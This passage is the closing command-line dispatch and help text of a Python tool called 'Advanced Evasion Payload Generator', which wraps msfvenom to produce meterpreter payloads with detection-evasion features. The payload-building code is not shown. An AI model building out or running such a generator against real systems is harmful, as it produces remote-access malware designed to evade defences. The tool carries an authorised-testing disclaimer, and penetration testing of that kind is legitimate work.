        if sys.argv[1] in ['-h', '--help', 'help']:
            print(f"""
{Fore.CYAN}Advanced Evasion Payload Generator v3.0{Fore.RESET}

{Fore.YELLOW}Usage:{Fore.RESET}
  python main.py              # Interactive menu mode
  python main.py quick        # Quick generate with defaults
  python main.py test         # Test all components
  python main.py --help       # Show this help

{Fore.YELLOW}Features:{Fore.RESET}
  • Real msfvenom integration (if available)
  • Multiple payload types and formats
  • Advanced evasion techniques
  • History tracking
  • Built-in testing tools

{Fore.YELLOW}Requirements:{Fore.RESET}
  • Kali Linux or msfvenom installed
  • Python 3.7+
  • colorama (pip install colorama)

{Fore.RED}⚠ FOR EDUCATIONAL/ AUTHORIZED TESTING ONLY{Fore.RESET}
            """)
            return
        
        elif sys.argv[1] == 'quick':
            print(Fore.YELLOW + "[*] Quick generating payload...")
            gen = AdvancedPayloadGenerator()
            gen.generate_payload('meterpreter')
            return
        
        elif sys.argv[1] == 'test':
            print(Fore.YELLOW + "[*] Testing components...")
            gen = AdvancedPayloadGenerator()
            gen._check_msfvenom()
            return
    
    # Start interactive mode
    try:
        generator = AdvancedPayloadGenerator()
        generator.run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
